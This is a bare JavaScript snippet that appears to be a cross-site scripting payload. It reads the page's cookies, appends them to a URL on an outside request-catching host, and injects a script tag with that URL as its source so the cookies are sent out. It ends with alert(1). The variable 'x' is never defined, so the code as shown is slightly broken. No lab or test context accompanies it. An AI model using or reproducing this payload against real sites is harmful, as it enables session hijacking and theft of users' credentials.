let url = `https://hyp.requestcatcher.com/?c=${document.cookie}`
const script = document.createElement("script")
script.src = url + x
document.head.appendChild(script)
alert(1)